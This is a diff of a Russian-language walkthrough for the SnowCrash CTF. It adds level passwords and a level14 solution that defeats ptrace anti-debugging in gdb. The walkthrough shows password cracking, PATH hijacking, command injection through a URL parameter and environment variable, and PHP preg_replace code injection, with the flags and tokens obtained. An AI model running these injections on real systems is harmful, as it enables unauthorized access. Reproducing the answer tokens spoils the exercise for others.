@@ -3,14 +3,16 @@
 su levelN, password: token
 su flagN, password: passwd
 
-## flag 1
+`ssh  level00@172.16.188.130 -p 4242`
+
+## level01 (x24ti5gi3x0ol2eh4esiuxias)
 
 * Находим пароль для flag01
 * Устанавливаем утилиту brew install john-jumbo
 * Копируем файл с паролями и запустим `john passwd --show`
 * Смотрим в `~/.john` -> `john.pot`, находим флаг: 42hDRfypTqqnw:abcdefg
 
-## flag 2
+## level02 (f2av5il02puano7naaf6adaaf)
 
 * Копируем файл `level02.pcap` на локальную машину
 * Устанавливаем `wireshark`
@@ -45,7 +47,7 @@ Packet	  Hexadecimal					     ASCII
 * определяем что 7f - это код DEL
 * значит код ft_waNDReL0L
 
-## flag 3
+## level03 (kooda2puivaav1idi4f57q8iq)
 
 * В директории видим файл level03 это исполняемый файл, выпоним `ltrace ./level03`
 получим:
@@ -68,7 +70,7 @@ system("/usr/bin/env echo Exploit me"Exploit me
 * `PATH=/tmp:$PATH`
 
 
-## flag 04
+## level04 (qi0maab88jeaj46qoumi7maus)
 
 * В директории видим файл level04.pl
 ```
@@ -86,7 +88,7 @@ x(param("x"));
 * Можно сделать csrf-атаку и в аргумент x положить `getflag`
 Пример: **curl http://localhost:4747?x=\`getflag\`**
 
-## flag 05
+## level05 (ne2searoevaevoem4ov4ar8ap)
 
 **You have new mail in /var/mail/level05**
 
@@ -108,14 +110,14 @@ done
 /bin/getflag > /tmp/flag
 ```
 
-## flag 06
+## level06 (viuaaale9huek52boumoomioc)
 
 * Смотрим на файл level06.php, видим что используется `preg_replace` с флагом `е`, которая пораждает уезвимость типа - PREG_REPLACE_EVAL (https://php.ru/manual/reference.pcre.pattern.modifiers.html#reference.pcre.pattern.modifiers.eval)
 * Смотрим на регулярку создаем файл с таким контентом: **echo "[x {${`getflag`}}]" > /tmp/l06**
 * Дергаем файл и вкачестве аргумента отправляем путь до файла
 
 
-## flag 07
+## level07 (wiok45aaoguiboiki2tuin6ub)
 * В директории видим файл level07 это исполняемый файл, выпоним `ltrace ./level07`
 получим:
 ```
@@ -137,7 +139,7 @@ system("/bin/echo level07 "level07
 * Заменим значение переменной среды на `LOGNAME="|getflag"`
 * Дернем ./level07
 
-## level08
+## level08 (fiumuikeil55xe9cu4dood66h)
 
 * Доступа к файлу token нет
 * В директории видим файл level08 это исполняемый файл, выпоним `ltrace ./level08 token`
@@ -293,4 +295,64 @@ End of assembler dump.
 
 * Видим что ничего нет
 * Будем мучить getflag
-*
+* Запустим `./ltrace getflag`
+```
+__libc_start_main(0x8048946, 1, 0xbffff7f4, 0x8048ed0, 0x8048f40 <unfinished ...>
+ptrace(0, 0, 1, 0, 0)= -1
+puts("You should not reverse this"You should not reverse this)= 28
++++ exited (status 1) +++
+```
+* Увидел что мы валимся на функции ptrace, запустим `gdb getflag`, Если отладчик, использующий ptrace (например, gdb или ltrace), используется в процессе, который вызывает ptrace, это приведет к ошибке, и ptrace вернет -1.
+* disass main, найдем `ptrace`
+```
+ 0x08048989 <+67>:	call   0x8048540 <ptrace@plt>
+ 0x0804898e <+72>:	test   %eax,%eax
+```
+* Мы видим, что сразу после вызова ptrace проверяется значение в регистре eax. Мы можем установить точку останова. мы видим, что значение в eax равно -1 `break *main+72`
+* Выставим значение 0, `set $eax=1`
+* `n` проходим дальше и видим что успешно все прошли:
+```
+(gdb) n
+Single stepping until exit from function main,
+which has no line number information.
+Check flag.Here is your token :
+Nope there is no token here for you sorry. Try again :)
+```
+* Теперь нам нужно проделать финт как в 13 задании, ищем getuid и место где происходит сравнение, смотрим кaкой uuid у flag14
+```
+   0x08048afd <+439>:   call   0x80484b0 <getuid@plt>
+   0x08048b02 <+444>:   mov    %eax,0x18(%esp)
+   0x08048b06 <+448>:   mov    0x18(%esp),%eax
+   0x08048b0a <+452>:   cmp    $0xbbe,%eax
+```
+
+```
+level10@SnowCrash:~$ cat /etc/passwd | grep level14
+level14:x:2014:2014::/home/user/level14:/bin/bash
+level10@SnowCrash:~$ cat /etc/passwd | grep flag14
+flag14:x:3014:3014::/home/flag/flag14:/bin/bash
+```
+
+* Делаем поинт на точке `b *main+452`
+* Все запускаем и выставляем нужные значения в регистры
+```
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /bin/getflag
+
+Breakpoint 1, 0x0804898e in main ()
+(gdb) set $eax=1
+(gdb) n
+Single stepping until exit from function main,
+which has no line number information.
+
+Breakpoint 2, 0x08048b0a in main ()
+(gdb) set $eax=3014
+(gdb) n
+Single stepping until exit from function main,
+which has no line number information.
+Check flag.Here is your token : 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
+0xb7e454d3 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6
+```
+* Мы нашли flag!!!
